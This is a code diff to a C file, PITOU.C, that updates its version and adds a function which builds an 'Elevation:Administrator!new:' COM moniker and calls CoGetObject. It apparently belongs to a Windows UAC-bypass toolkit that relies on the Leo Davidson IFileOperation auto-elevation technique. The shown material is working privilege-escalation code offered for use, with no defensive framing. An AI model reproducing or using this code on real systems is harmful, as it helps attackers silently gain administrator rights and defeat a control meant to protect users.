@@ -4,9 +4,9 @@
 *
 *  TITLE:       PITOU.C
 *
-*  VERSION:     2.53
+*  VERSION:     2.55
 *
-*  DATE:        18 Jan 2017
+*  DATE:        08 Feb 2017
 *
 *  Leo Davidson based IFileOperation auto-elevation.
 *
@@ -462,4 +462,41 @@ BOOL ucmStandardAutoElevation(
     } while (cond);
 
     return bResult;
+}
+
+/*
+* ucmMasqueradedCoGetObjectElevate
+*
+* Purpose:
+*
+* CoGetObject elevation as admin.
+*
+*/
+HRESULT ucmMasqueradedCoGetObjectElevate(
+    _In_ LPWSTR clsid,
+    _In_ DWORD dwClassContext,
+    _In_ REFIID riid,
+    _Outptr_ void **ppv
+    )
+{
+    HRESULT     r = E_FAIL;
+    BIND_OPTS3  bop;
+    WCHAR       szElevationMoniker[MAX_PATH];
+
+    if (clsid == NULL)
+        return r;
+
+    if (_strlen(clsid) > 64)
+        return r;
+
+    RtlSecureZeroMemory(szElevationMoniker, sizeof(szElevationMoniker));
+
+    _strcpy(szElevationMoniker, L"Elevation:Administrator!new:");
+    _strcat(szElevationMoniker, clsid);
+
+    RtlSecureZeroMemory(&bop, sizeof(bop));
+    bop.cbStruct = sizeof(bop);
+    bop.dwClassContext = dwClassContext;
+
+    return CoGetObject(szElevationMoniker, (BIND_OPTS *)&bop, riid, ppv);
 }
